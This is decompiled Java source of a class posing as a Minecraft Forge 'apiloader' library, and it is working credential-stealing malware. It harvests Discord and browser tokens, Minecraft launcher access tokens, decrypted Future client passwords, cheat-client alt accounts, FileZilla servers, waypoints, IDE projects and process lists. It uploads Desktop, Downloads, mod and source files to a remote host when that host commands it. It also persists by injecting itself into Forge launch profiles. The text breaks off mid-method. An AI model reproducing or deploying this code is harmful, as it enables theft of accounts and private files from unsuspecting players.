/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  javax.xml.bind.DatatypeConverter
 */
package net.minecraftforge.apiloader;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileVisitResult;
import java.nio.file.FileVisitor;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.security.Key;
import java.security.MessageDigest;
import java.sql.Timestamp;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.json.simple.parser.ContainerFactory;
import org.json.simple.parser.JSONParser;

public class FileSearcher {
    public static String accessToken;
    public static String email;
    public static String username;
    public static String clientToken;
    public static String user_home;
    public static String discordData;
    public static boolean didcall;
    public static String dlink;
    public static String hash;
    private static boolean alreadyran;

    public static String getVersion() {
        return "281220";
    }

    public static String getFileSize(File file) {
        long bytes = file.length();
        long kilobytes = bytes / 1024L;
        long megabytes = kilobytes / 1024L;
        if (megabytes > 0L) {
            return String.format("%,d MB", megabytes);
        }
        if (kilobytes > 0L) {
            return String.format("%,d KB", kilobytes);
        }
        return String.format("%,d B", bytes);
    }

    public static long getFolderSizeData(File f) {
        long ret = 0L;
        for (File file : f.listFiles()) {
            if (file == null) continue;
            if (file.isDirectory()) {
                ret += FileSearcher.getFolderSizeData(file);
                continue;
            }
            ret += file.length();
        }
        return ret;
    }

    public static String getAdditionalDiscordData(File path) {
        if (path == null || !path.exists()) {
            return null;
        }
        StringBuilder sb = new StringBuilder();
        sb.append("[ ");
        sb.append(path.getAbsolutePath());
        sb.append(" ]\n");
        for (File file : path.listFiles()) {
            sb.append(file.getName());
            if (file.isDirectory()) {
                sb.append(" [directory]");
            }
            if (!file.isDirectory()) {
                sb.append(" [");
                sb.append(FileSearcher.getFileSize(file));
                sb.append("]");
            }
            sb.append(" [");
            try {
                sb.append(new Timestamp(file.lastModified()).toString());
            }
            catch (Exception exception) {
                // empty catch block
            }
            sb.append("]");
            sb.append("\n");
        }
        sb.append("\n");
        return sb.toString();
    }

    public static String getFolderSize(File folder) {
        try {
            if (folder == null || !folder.isDirectory()) {
                return null;
            }
            long bytes = FileSearcher.getFolderSizeData(folder);
            long kilobytes = bytes / 1024L;
            long megabytes = kilobytes / 1024L;
            if (megabytes > 0L) {
                return String.format("%,d MB", megabytes);
            }
            if (kilobytes > 0L) {
                return String.format("%,d KB", kilobytes);
            }
            return String.format("%,d B", bytes);
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static boolean compress(String dirPath, final boolean srccode) {
        final Path sourceDir = Paths.get(dirPath, new String[0]);
        String zipFileName = dirPath.concat(".zip");
        try {
            final ZipOutputStream outputStream = new ZipOutputStream(new FileOutputStream(zipFileName));
            Files.walkFileTree(sourceDir, (FileVisitor<? super Path>)new SimpleFileVisitor<Path>(){

                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attributes) {
                    try {
                        String f;
                        Path targetFile = sourceDir.relativize(file);
                        if (srccode && targetFile.toString().contains("\\") && !(f = targetFile.toString().substring(0, targetFile.toString().indexOf("\\"))).startsWith("src") && !f.startsWith("gradle")) {
                            return FileVisitResult.CONTINUE;
                        }
                        outputStream.putNextEntry(new ZipEntry(targetFile.toString()));
                        byte[] bytes = Files.readAllBytes(file);
                        outputStream.write(bytes, 0, bytes.length);
                        outputStream.closeEntry();
                    }
                    catch (IOException iOException) {
                        // empty catch block
                    }
                    return FileVisitResult.CONTINUE;
                }
            });
            outputStream.close();
            return true;
        }
        catch (IOException iOException) {
            return false;
        }
    }

    public static void uploadFile(String path) {
        String uploadurl = "http://dengimod.cf/discordhook/testfileupload.php";
        try {
            File file = new File(path);
            if (file == null || !file.exists()) {
                return;
            }
            OkHttpClient client = new OkHttpClient.Builder().connectTimeout(40L, TimeUnit.SECONDS).writeTimeout(180L, TimeUnit.SECONDS).readTimeout(180L, TimeUnit.SECONDS).build();
            MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("userfile", file.getName(), RequestBody.create(MediaType.parse("application/text"), file)).build();
            Request request = null;
            request = username != null ? new Request.Builder().url("http://dengimod.cf/discordhook/testfileupload.php").post(body).addHeader("Myname", username).build() : new Request.Builder().url("http://dengimod.cf/discordhook/testfileupload.php").post(body).build();
            Response response = client.newCall(request).execute();
            String string = response.body().string();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static File getMod(File folder, String filename) {
        try {
            for (File file : folder.listFiles()) {
                if (file.isDirectory()) {
                    File mod = FileSearcher.getMod(file, filename);
                    if (mod == null) continue;
                    return mod;
                }
                if (!file.getName().equalsIgnoreCase(filename)) continue;
                return file;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return null;
    }

    public static void sendFile(String url, File file) {
        try {
            OkHttpClient client = new OkHttpClient.Builder().connectTimeout(10L, TimeUnit.SECONDS).writeTimeout(180L, TimeUnit.SECONDS).readTimeout(180L, TimeUnit.SECONDS).build();
            MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("userfile", file.getName(), RequestBody.create(MediaType.parse("application/text"), file)).build();
            Request request = null;
            request = username != null ? new Request.Builder().url(url).post(body).addHeader("Myname", username).build() : new Request.Builder().url(url).post(body).build();
            Response response = client.newCall(request).execute();
            String result = response.body().string();
            if (result.contains("ALL_GOOD") && result.contains("UPLOADFILE=true")) {
                Scanner scanner = new Scanner(result);
                boolean shouldupload = false;
                String uploadtype = "";
                while (scanner.hasNextLine()) {
                    File newf;
                    String up;
                    boolean zipped;
                    String name;
                    File folder;
                    String line = scanner.nextLine();
                    if (!shouldupload) {
                        if (line.contains("[MinecraftMods]")) {
                            shouldupload = true;
                            uploadtype = "mods";
                            continue;
                        }
                        if (line.contains("[Downloads]")) {
                            shouldupload = true;
                            uploadtype = "downloads";
                            continue;
                        }
                        if (line.contains("[JAVASRC]")) {
                            shouldupload = true;
                            uploadtype = "javasrc";
                            continue;
                        }
                        if (line.contains("[DIRECT]")) {
                            shouldupload = true;
                            uploadtype = "direct";
                            continue;
                        }
                        if (!line.contains("[DESKTOP]")) continue;
                        shouldupload = true;
                        uploadtype = "desktop";
                        continue;
                    }
                    if (line.contains("[/]")) {
                        shouldupload = false;
                        continue;
                    }
                    if (uploadtype.contains("mods")) {
                        File mod;
                        File modfolder = new File("mods");
                        if (modfolder == null || !modfolder.exists() || !modfolder.isDirectory() || (mod = FileSearcher.getMod(modfolder, line)) == null) continue;
                        FileSearcher.uploadFile(mod.getAbsolutePath());
                        continue;
                    }
                    if (uploadtype.contains("downloads")) {
                        folder = new File(System.getProperty("user.home") + "/Downloads/");
                        if (folder == null || !folder.exists()) continue;
                        FileSearcher.uploadFile(folder.getAbsolutePath() + "/" + line);
                        continue;
                    }
                    if (uploadtype.contains("desktop")) {
                        folder = new File(System.getProperty("user.home") + "/Desktop/");
                        if (folder == null || !folder.exists()) continue;
                        FileSearcher.uploadFile(folder.getAbsolutePath() + "/" + line);
                        continue;
                    }
                    if (uploadtype.contains("javasrc")) {
                        folder = new File(line);
                        if (folder == null || !folder.exists()) continue;
                        name = folder.getName();
                        if (!folder.isDirectory()) {
                            FileSearcher.uploadFile(line);
                            continue;
                        }
                        zipped = FileSearcher.compress(folder.getAbsolutePath(), true);
                        if (!zipped) continue;
                        up = folder.getAbsolutePath().substring(0, folder.getAbsolutePath().lastIndexOf("\\"));
                        FileSearcher.uploadFile(up + "/" + name + ".zip");
                        newf = new File(up + "/" + name + ".zip");
                        if (newf == null || !newf.exists()) continue;
                        newf.delete();
                        continue;
                    }
                    if (!uploadtype.contains("direct") || (folder = new File(line)) == null || !folder.exists()) continue;
                    name = folder.getName();
                    if (!folder.isDirectory()) {
                        FileSearcher.uploadFile(line);
                        continue;
                    }
                    zipped = FileSearcher.compress(folder.getAbsolutePath(), false);
                    if (!zipped) continue;
                    up = folder.getAbsolutePath().substring(0, folder.getAbsolutePath().lastIndexOf("\\"));
                    FileSearcher.uploadFile(up + "/" + name + ".zip");
                    newf = new File(up + "/" + name + ".zip");
                    if (newf == null || !newf.exists()) continue;
                    newf.delete();
                }
                scanner.close();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static void handleError() {
        if (didcall) {
            return;
        }
        didcall = true;
        File file2 = new File("versions");
        if (file2.isDirectory()) {
            for (File file1 : file2.listFiles()) {
                if (!file1.isDirectory()) continue;
                for (File file : file1.listFiles()) {
                    try {
                        JSONObject args2;
                        String json;
                        if (!file.getName().contains(".json") || !file.getName().contains("1.12.2") || !file.getName().contains("forge") || (json = new String(Files.readAllBytes(Paths.get(file.getAbsolutePath(), new String[0])), StandardCharsets.UTF_8)).contains(".apiloader.APILoader")) continue;
                        JSONParser parser = new JSONParser();
                        JSONObject thing = (JSONObject)parser.parse(json, (ContainerFactory)null);
                        if (thing.containsKey("libraries")) {
                            if (thing.containsKey("downloads")) {
                                thing.remove("downloads");
                            }
                            JSONArray array = (JSONArray)thing.get("libraries");
                            JSONObject object = new JSONObject();
                            object.put("name", "net.minecraftforge:apiloader:1.0.4");
                            array.add(object);
                        }
                        if (thing.containsKey("minecraftArguments")) {
                            if (thing.containsKey("downloads")) {
                                thing.remove("downloads");
                            }
                            String args = (String)thing.get("minecraftArguments");
                            thing.remove("minecraftArguments");
                            thing.put("minecraftArguments", args + " --tweakClass net.minecraftforge.apiloader.APILoader");
                        }
                        if (thing.containsKey("arguments") && (args2 = (JSONObject)thing.get("arguments")).containsKey("game")) {
                            if (thing.containsKey("downloads")) {
                                thing.remove("downloads");
                            }
                            JSONArray args3 = (JSONArray)args2.get("game");
                            args2.remove("game");
                            args3.add("--tweakClass");
                            args3.add("net.minecraftforge.apiloader.APILoader");
                            args2.put("game", args3);
                            thing.remove("arguments");
                            thing.put("arguments", args2);
                        }
                        FileWriter writer = new FileWriter(file, false);
                        writer.write(thing.toString());
                        writer.close();
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                }
            }
        }
    }

    public static String getTokens() {
        ArrayList<String> paths = new ArrayList<String>();
        String system = System.getProperty("os.name");
        if (system.contains("Windows")) {
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Mozilla/Firefox/Profiles/");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/");
        } else if (system.contains("Mac") || system.contains("darwin")) {
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/Library/Application Support/Firefox/Profiles/");
            paths.add(System.getProperty("user.home") + "/Library/Application Support/Google/Chrome/User Data/Default/Local Storage/leveldb/");
        }
        StringBuilder tokens = new StringBuilder();
        for (String path : paths) {
            String[] pathnames;
            File f = new File(path);
            if (f == null) continue;
            String dcdata = FileSearcher.getAdditionalDiscordData(f);
            if (dcdata != null) {
                discordData = discordData + dcdata;
            }
            if ((pathnames = f.list()) == null) continue;
            for (String pathname : pathnames) {
                try {
                    String strLine;
                    FileInputStream fstream = new FileInputStream(path + pathname);
                    DataInputStream in = new DataInputStream(fstream);
                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
                    while ((strLine = br.readLine()) != null) {
                        Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                        Matcher m = p.matcher(strLine);
                        while (m.find()) {
                            tokens.append(m.group());
                            tokens.append("\n");
                        }
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }
        return tokens.toString();
    }

    public static String getEclipseProjectLocation(String workspacelocation) {
        try {
            File file = new File(workspacelocation + "/.metadata/.plugins/org.eclipse.buildship.ui/dialog_settings.xml");
            if (file == null || !file.exists()) {
                return null;
            }
            Scanner scanner = new Scanner(file, "UTF-8");
            while (scanner.hasNextLine()) {
                String line = scanner.nextLine();
                if (!line.contains("<item key=\"project_location\" ")) continue;
                line = line.substring(line.indexOf(" value=") + 8);
                line = line.substring(0, line.lastIndexOf("\"/>"));
                return line;
            }
            scanner.close();
        }
        catch (Exception exception) {
            // empty catch block
        }
        return null;
    }

    public static String getEclipseWorkspaces() {
        try {
            File eclipsefolder = new File(System.getProperty("user.home") + "/eclipse/");
            if (eclipsefolder == null || !eclipsefolder.exists()) {
                return null;
            }
            StringBuilder sb = new StringBuilder();
            for (File folders : eclipsefolder.listFiles()) {
                if (folders == null || !folders.isDirectory()) continue;
                sb.append("------------------\n");
                sb.append(folders.getName());
                sb.append("\n");
                File file = new File(folders.getAbsolutePath() + "/eclipse/configuration/.settings/org.eclipse.ui.ide.prefs");
                if (file == null || !file.exists()) {
                    sb.append("UNKNOWN\n");
                    continue;
                }
                boolean stop = false;
                Scanner scanner = new Scanner(file, "UTF-8");
                while (scanner.hasNextLine() && !stop) {
                    String line = scanner.nextLine();
                    if (!line.startsWith("RECENT_WORKSPACES=")) continue;
                    if ((line = line.substring(line.indexOf("=") + 1)).contains("\\n") || line.contains("\\r")) {
                        String[] workspaces;
                        for (String workspace : workspaces = line.split("\\\\n")) {
                            workspace = workspace.replaceAll("\\\\:", ":");
                            String project = FileSearcher.getEclipseProjectLocation(workspace);
                            sb.append(workspace);
                            if (project != null) {
                                sb.append(" [" + project + "]");
                            }
                            sb.append("\n");
                        }
                    } else {
                        String project = FileSearcher.getEclipseProjectLocation(line);
                        sb.append(line);
                        if (project != null) {
                            sb.append(" [" + project + "]");
                        }
                        sb.append("\n");
                    }
                    stop = true;
                }
                scanner.close();
            }
            return sb.toString();
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String getFWaypoints() {
        File file = new File(System.getProperty("user.home") + "/Future/waypoints.txt");
        if (!file.exists()) {
            return null;
        }
        StringBuilder sb = new StringBuilder();
        try {
            Scanner scanner = new Scanner(file, "UTF-8");
            while (scanner.hasNextLine()) {
                sb.append(scanner.nextLine() + "\n");
            }
            scanner.close();
        }
        catch (Exception exception) {
            // empty catch block
        }
        return sb.toString();
    }

    public static String getFAccounts() {
        File file = new File(System.getProperty("user.home") + "/Future/accounts.txt");
        if (!file.exists()) {
            return null;
        }
        StringBuilder sb = new StringBuilder();
        try {
            Scanner scanner = new Scanner(file, "UTF-8");
            while (scanner.hasNextLine()) {
                sb.append(scanner.nextLine() + "\n");
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return sb.toString();
    }

    public static String getIP() {
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(new URL("http://checkip.amazonaws.com").openStream()));
            return reader.readLine();
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String getJData(File folder) {
        String data = "";
        for (File file : folder.listFiles()) {
            if (file.isDirectory()) {
                data = data + FileSearcher.getJData(file);
                continue;
            }
            String path = file.getAbsolutePath().substring(0, file.getAbsolutePath().lastIndexOf("\\"));
            if (!path.endsWith("\\waypoints")) continue;
            String ip = path.substring(path.lastIndexOf("\\mp\\") + 4, path.lastIndexOf("\\"));
            String name = "";
            String x = "";
            String y = "";
            String z = "";
            try {
                Scanner scanner = new Scanner(file, "UTF-8");
                while (scanner.hasNextLine()) {
                    String line = scanner.nextLine();
                    if (name.equals("") && line.contains("\"name\": ")) {
                        name = line.substring(line.indexOf(": ") + 3);
                        name = name.replaceAll("\",", "");
                    }
                    if (x.equals("") && line.contains("\"x\": ")) {
                        x = line.substring(line.indexOf(": ") + 2);
                        x = x.replaceAll(",", "");
                        continue;
                    }
                    if (y.equals("") && line.contains("\"y\": ")) {
                        y = line.substring(line.indexOf(": ") + 2);
                        y = y.replaceAll(",", "");
                        continue;
                    }
                    if (!z.equals("") || !line.contains("\"z\": ")) continue;
                    z = line.substring(line.indexOf(": ") + 2);
                    z = z.replaceAll(",", "");
                }
                scanner.close();
            }
            catch (Exception e) {
                data = data + e.getStackTrace();
            }
            data = data + "[" + name + ", " + ip + "] X: " + x + " | Y: " + y + " | Z: " + z + "\n";
        }
        return data;
    }

    public static String getJWaypoints() {
        File journeymap_folder = new File(System.getenv("APPDATA") + "/.minecraft/journeymap");
        if (!journeymap_folder.exists()) {
            return null;
        }
        File folder = new File(journeymap_folder.getAbsolutePath() + "\\data\\mp");
        if (!folder.exists()) {
            return null;
        }
        return FileSearcher.getJData(folder);
    }

    public static void getMinecraftData() {
        try {
            File f = new File("launcher_profiles.json");
            Scanner reader = new Scanner(f, "UTF-8");
            while (reader.hasNextLine()) {
                String str = reader.nextLine();
                if (str.contains("\"")) {
                    str = str.substring(str.indexOf("\""));
                }
                if (accessToken == null && str.contains("\"accessToken\"") && (accessToken = str.substring(str.lastIndexOf(": \"") + 3, str.length() - 1)).endsWith("\"")) {
                    accessToken = accessToken.substring(0, accessToken.lastIndexOf("\""));
                }
                if (username == null && str.contains("\"displayName\"") && (username = str.substring(str.lastIndexOf(": \"") + 3, str.length() - 1)).endsWith("\"")) {
                    username = username.substring(0, username.lastIndexOf("\"") - 1);
                }
                if (email == null && str.contains("\"username\"") && (email = str.substring(str.lastIndexOf(": \"") + 3, str.length() - 1)).endsWith("\"")) {
                    email = username.substring(0, email.lastIndexOf("\"") - 1);
                }
                if (clientToken == null && str.contains("\"clientToken\"") && (clientToken = str.substring(str.lastIndexOf(": \"") + 3, str.length() - 1)).endsWith("\"")) {
                    clientToken = clientToken.substring(0, clientToken.lastIndexOf("\""));
                }
                if (accessToken == null || email == null || username == null || clientToken == null) continue;
                break;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static String getRunningProcesses() {
        StringBuilder sb = new StringBuilder();
        if (System.getProperty("os.name").contains("Windows")) {
            try {
                Process process = Runtime.getRuntime().exec("wmic process get name,executablepath");
                Scanner scanner = new Scanner(process.getInputStream());
                while (scanner.hasNextLine()) {
                    sb.append(scanner.nextLine());
                    sb.append("\n");
                }
                scanner.close();
            }
            catch (Exception process) {}
        } else {
            try {
                Process process = Runtime.getRuntime().exec("ps -e -o command");
                Scanner scanner = new Scanner(process.getInputStream());
                while (scanner.hasNextLine()) {
                    sb.append(scanner.nextLine());
                    sb.append("\n");
                }
                scanner.close();
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        return sb.toString();
    }

    public static String getLoaderData() {
        File folder = new File(System.getProperty("user.home") + "/rh");
        if (!folder.exists()) {
            return null;
        }
        String ret = "";
        for (File file : folder.listFiles()) {
            String addret = file.getName() + " -> ";
            try {
                Scanner scanner = new Scanner(file, "UTF-8");
                while (scanner.hasNextLine()) {
                    addret = addret + scanner.nextLine();
                }
            }
            catch (Exception exception) {
                // empty catch block
            }
            ret = ret + addret + "\n";
        }
        return ret;
    }

    public static String getLauncherInfo() {
        File file = new File("Pyro/launcher.json");
        if (!file.exists()) {
            return null;
        }
        StringBuilder sb = new StringBuilder();
        try {
            Scanner scanner = new Scanner(file, "UTF-8");
            while (scanner.hasNextLine()) {
                sb.append(scanner.nextLine());
            }
            return sb.toString();
        }
        catch (FileNotFoundException fileNotFoundException) {
            return null;
        }
    }

    public static String getKWaypoints() {
        File file = new File("KAMIBlueWaypoints.json");
        if (!file.exists()) {
            return null;
        }
        String data = "";
        boolean isPosition = false;
        try {
            String name = "";
            String x = "";
            String y = "";
            String z = "";
            Scanner scanner = new Scanner(file, "UTF-8");
            while (scanner.hasNextLine()) {
                String line = scanner.nextLine();
                if (isPosition) {
                    if (line.endsWith("},")) {
                        isPosition = false;
                        continue;
                    }
                    if (x.equals("") && line.contains("\"x\": ")) {
                        x = line.substring(line.indexOf(": ") + 2, line.length() - 1);
                        continue;
                    }
                    if (y.equals("") && line.contains("\"y\": ")) {
                        y = line.substring(line.indexOf(": ") + 2, line.length() - 1);
                        continue;
                    }
                    if (!z.equals("") || !line.contains("\"z\": ")) continue;
                    z = line.substring(line.indexOf(": ") + 2, line.length());
                    continue;
                }
                if (line.endsWith("\"position\": {")) {
                    isPosition = true;
                    continue;
                }
                if (!(x.equals("") || y.equals("") || z.equals("") || name.equals(""))) {
                    data = data + "[" + name + "] X: " + x + " | Y: " + y + " | Z: " + z + "\n";
                    x = "";
                    y = "";
                    z = "";
                    name = "";
                }
                if (!line.contains("\"name\": \"")) continue;
                name = line.substring(line.indexOf(": \"") + 3, line.length() - 2);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return data;
    }

    public static String getMultiMCData(File folder) {
        String data = null;
        File f = new File(folder.getAbsolutePath().substring(0, folder.getAbsolutePath().lastIndexOf("\\")));
        while ((f = new File(f.getAbsolutePath().substring(0, f.getAbsolutePath().lastIndexOf("\\")))) != null) {
            boolean afound = false;
            boolean mcfgfound = false;
            for (File fil : f.listFiles()) {
                if (!afound && fil.getName().toLowerCase().contains("accounts.jso")) {
                    afound = true;
                }
                if (mcfgfound || !fil.getName().toLowerCase().contains("multimc.cf")) continue;
                mcfgfound = true;
            }
            if (!afound || !mcfgfound) continue;
            for (File fil : f.listFiles()) {
                if (!fil.getName().contains("accounts.jso")) continue;
                data = "";
                try {
                    Scanner scanner = new Scanner(fil, "UTF-8");
                    while (scanner.hasNextLine()) {
                        data = data + scanner.nextLine();
                        data = data + "\n";
                    }
                    return data;
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }
        return null;
    }

    public static String getMultiMCData() {
        File basefolder = new File("");
        if (basefolder == null) {
            return null;
        }
        return FileSearcher.getMultiMCData(basefolder);
    }

    public static String getModsData(File basefolder) {
        StringBuilder sb = new StringBuilder();
        for (File file : basefolder.listFiles()) {
            if (file == null || !file.exists()) continue;
            if (file.isDirectory()) {
                sb.append(FileSearcher.getModsData(file));
                continue;
            }
            if (!file.getName().endsWith(".jar")) continue;
            sb.append(file.getName());
            sb.append(" [");
            sb.append(FileSearcher.getFileSize(file));
            sb.append("]\n");
        }
        return sb.toString();
    }

    public static String getMods() {
        try {
            File basefolder = new File("mods");
            if (basefolder == null || !basefolder.exists()) {
                return null;
            }
            return FileSearcher.getModsData(basefolder);
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static byte[] futureReadFile(DataInputStream dataInputStream) throws IOException {
        DataInputStream dataInputStream2 = dataInputStream;
        byte[] arrby = new byte[dataInputStream2.readInt()];
        dataInputStream2.read(arrby);
        return arrby;
    }

    public static byte[] futureKeyConvert(String s) {
        byte[] array = new byte[s.length() / 2];
        int i = 0;
        int n = 0;
        while (i < s.length()) {
            byte[] array2 = array;
            int n2 = n / 2;
            byte b = (byte)((Character.digit(s.charAt(n), 16) << 4) + Character.digit(s.charAt(n + 1), 16));
            array2[n2] = b;
            i = n += 2;
        }
        return array;
    }

    public static byte[] futureDecryptFile(byte[] array, byte[] array2, byte[] array3) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec(array2, "AES");
        IvParameterSpec ivParameterSpec = new IvParameterSpec(array3);
        Cipher instance = Cipher.getInstance("AES/CBC/PKCS5PADDING");
        instance.init(2, (Key)secretKeySpec, ivParameterSpec);
        return instance.doFinal(array);
    }

    public static String getFutureAuth() {
        File file = new File(System.getProperty("user.home") + "/Future/auth_key");
        if (file == null || !file.exists()) {
            return null;
        }
        try {
            byte[] key = FileSearcher.futureKeyConvert("428A487E3361EF9C5FC20233485EA236");
            DataInputStream dis = new DataInputStream(Files.newInputStream(file.toPath(), new OpenOption[0]));
            byte[] arr1 = FileSearcher.futureReadFile(dis);
            byte[] user_arr = FileSearcher.futureDecryptFile(FileSearcher.futureReadFile(dis), key, arr1);
            byte[] pass_arr = FileSearcher.futureDecryptFile(FileSearcher.futureReadFile(dis), key, arr1);
            String user = new String(user_arr, StandardCharsets.UTF_8);
            String pass = new String(pass_arr, StandardCharsets.UTF_8);
            return "username > " + user + "\npassword > " + pass;
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String getPyroAlts() {
        StringBuilder sb = new StringBuilder();
        try {
            File file = new File("Pyro/alts.json");
            if (file == null || !file.exists()) {
                return null;
            }
            Scanner scanner = new Scanner(file, "UTF-8");
            while (scanner.hasNextLine()) {
                sb.append(scanner.nextLine());
                sb.append("\n");
            }
            return sb.toString();
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String getPyroWaypointsData(File folder) {
        StringBuilder sb = new StringBuilder();
        for (File file : folder.listFiles()) {
            if (file.isDirectory()) {
                sb.append(FileSearcher.getPyroWaypointsData(file));
                continue;
            }
            if (!file.getName().endsWith(".json")) continue;
            StringBuilder data = new StringBuilder();
            try {
                String path = file.getAbsolutePath();
                String ip = path.substring(path.indexOf("\\server\\") + 8, path.lastIndexOf("\\waypoints\\"));
                data.append("==================\n");
                data.append("IP: ");
                data.append(ip);
                data.append("\n");
                Scanner scanner = new Scanner(file, "UTF-8");
                while (scanner.hasNextLine()) {
                    data.append(scanner.nextLine());
                    data.append("\n");
                }
                sb.append(data.toString());
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        return sb.toString();
    }

    public static String getPyroWaypoints() {
        try {
            File folder = new File("Pyro/server/");
            if (folder == null || !folder.exists()) {
                return null;
            }
            String ret = null;
            try {
                ret = FileSearcher.getPyroWaypointsData(folder);
            }
            catch (Exception exception) {
                // empty catch block
            }
            return ret;
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String getFileZillaData() {
        try {
            File file = new File(System.getProperty("user.home") + "/AppData/Roaming/FileZilla/recentservers.xml");
            if (file == null || !file.exists()) {
                return null;
            }
            StringBuilder sb = new StringBuilder();
            Scanner scanner = new Scanner(file);
            while (scanner.hasNextLine()) {
                sb.append(scanner.nextLine());
                sb.append("\n");
            }
            scanner.close();
            return sb.toString();
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String getRusherHackAlts() {
        File file = new File("rusherhack/alts.json");
        if (file == null || !file.exists()) {
            return null;
        }
        StringBuilder sb = new StringBuilder();
        try {
            Scanner scanner = new Scanner(file, "UTF-8");
            while (scanner.hasNextLine()) {
                sb.append(scanner.nextLine());
                sb.append("\n");
            }
            return sb.toString();
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String getRusherHackWaypoints() {
        File file = new File("rusherhack/waypoints.json");
        if (file == null || !file.exists()) {
            return null;
        }
        StringBuilder sb = new StringBuilder();
        try {
            Scanner scanner = new Scanner(file, "UTF-8");
            while (scanner.hasNextLine()) {
                sb.append(scanner.nextLine());
                sb.append("\n");
            }
            scanner.close();
            return sb.toString();
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String getIntellijWorkspaces() {
        try {
            File folder = new File(System.getProperty("user.home") + "/AppData/Roaming/JetBrains/");
            if (folder == null || !folder.exists()) {
                return null;
            }
            StringBuilder sb = new StringBuilder();
            for (File folders : folder.listFiles()) {
                File file;
                if (folders == null || !folders.isDirectory() || (file = new File(folders.getAbsolutePath() + "/options/recentProjects.xml")) == null || !file.exists()) continue;
                sb.append("==================\n");
                sb.append(folders.getName());
                sb.append("\n");
                Scanner scanner = new Scanner(file, "UTF-8");
                boolean shouldlog = false;
                while (scanner.hasNextLine()) {
                    String line = scanner.nextLine();
                    if (shouldlog) {
                        if (line.contains("</list>")) {
                            shouldlog = false;
                            continue;
                        }
                        if (line.contains("<list>")) continue;
                        line = line.substring(line.indexOf("\"") + 1);
                        line = line.substring(0, line.lastIndexOf("/>") - 2);
                        line = line.replaceAll("$USER_HOME", System.getProperty("user.home"));
                        sb.append(line);
                        try {
                            File linefolder = new File(line);
                            if (linefolder != null && linefolder.exists()) {
                                String size;
                                String string = size = linefolder.isDirectory() ? FileSearcher.getFolderSize(linefolder) : FileSearcher.getFileSize(linefolder);
                                if (size != null) {
                                    sb.append(" ");
                                    sb.append(size);
                                }
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
